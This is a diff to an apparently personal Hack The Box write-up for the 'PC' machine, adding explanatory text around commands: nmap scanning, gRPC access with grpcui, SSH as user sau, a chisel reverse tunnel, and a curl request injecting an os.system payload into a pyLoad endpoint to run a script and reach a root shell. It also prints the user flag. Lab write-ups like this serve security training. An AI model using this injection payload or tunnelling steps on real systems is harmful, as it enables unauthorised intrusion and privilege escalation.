@@ -1,3 +1,6 @@
+Nmap reveals a strange port that is open, accessing the webpage does not reveal anything.
+
+```
 └──╼ [★]$ nmap -sC -A -T4 -p- -Pn 10.129.85.76
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-07 20:42 BST
 Nmap scan report for 10.129.85.76
@@ -11,23 +14,31 @@ PORT      STATE SERVICE VERSION
 |_  256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
 50051/tcp open  unknown
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+```
 
-
+Attempting to connect to it does give us a hint.
+```
 └──╼ [★]$ telnet 10.129.85.76 50051
 Trying 10.129.85.76...
 Connected to 10.129.85.76.
 Escape character is '^]'.
 ?�?� ?@Did not receive HTTP/2 settings before handshake timeoutConnection closed by foreign host.
+```
+
+After some googling I learned that it was a grpc server and we can access that by installing the gui.
 
 https://github.com/fullstorydev/grpcui
-
+```
 └──╼ [★]$ go install github.com/fullstorydev/grpcui/cmd/grpcui@latest
-
+```
+```
 └──╼ [★]$ chmod -R 777 go/
-
+```
+```
 └──╼ [★]$ ./grpcui -plaintext 10.129.94.151:50051
 gRPC Web UI available at http://127.0.0.1:32953/
-
+```
+After installing and running the program we are greeted with a page.
 
 ![image](https://github.com/Rogue-1/HTB/assets/105310322/1798d19a-54b0-47d8-8efa-4114f991063c)
 
@@ -38,7 +49,7 @@ gRPC Web UI available at http://127.0.0.1:32953/
 ![image](https://github.com/Rogue-1/HTB/assets/105310322/ba5b0b95-e080-4f05-8355-b9564cedfe57)
 
 ![image](https://github.com/Rogue-1/HTB/assets/105310322/89b443cb-3cd5-40c0-b7bf-bfb58ec18094)
-
+```
 └──╼ [★]$ ssh sau@10.129.94.151
 sau@10.129.94.151's password: 
 Last login: Mon May 15 09:00:44 2023 from 10.10.14.19
@@ -47,10 +58,10 @@ uid=1001(sau) gid=1001(sau) groups=1001(sau)
 
 sau@pc:~$ cat user.txt
 474dded2f0348a7c9aacbad64cb7e513
+```
 
 
-
-
+```
 └──╼ [★]$ chisel server --reverse --port 1234
 2023/07/11 22:04:39 server: Reverse tunnelling enabled
 2023/07/11 22:04:39 server: Fingerprint izTDIgf3pIe+DypOlVdLmutBd4Tj0fu+cuNRh3rvtyM=
@@ -59,11 +70,11 @@ sau@pc:~$ cat user.txt
 
 sau@pc:/dev/shm$ ./chisel client 10.10.14.31:1234 R:8000:127.0.0.1:8000
 2023/07/11 21:04:15 client: Connecting to ws://10.10.14.31:1234
-
+```
 
 ![image](https://github.com/Rogue-1/HTB/assets/105310322/010ff159-666f-4e78-a64d-11f764d553d9)
 
-
+```
 └──╼ [★]$ curl -i -s -k -X $'POST'     --data-binary $'jk=pyimport%20os;os.system(\"bash%20/dev/shm/bash.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa'     $'http://127.0.0.1:8000/flash/addcrypted2'
 HTTP/1.1 500 INTERNAL SERVER ERROR
 Content-Type: text/html; charset=utf-8
@@ -76,7 +87,7 @@ Date: Tue, 11 Jul 2023 21:27:37 GMT
 Server: Cheroot/8.6.0
 
 Could not decrypt key
-
+```
 ```
 #!/bin/bash
 
@@ -95,5 +106,5 @@ sau@pc:/dev/shm$ ls -la /bin/bash
 ```
 sau@pc:/dev/shm$ bash -p
 bash-5.0# cat /root/root.txt
-d54654eeb7d4934ce9f86fe80693accf
+d54654ee************************
 ```
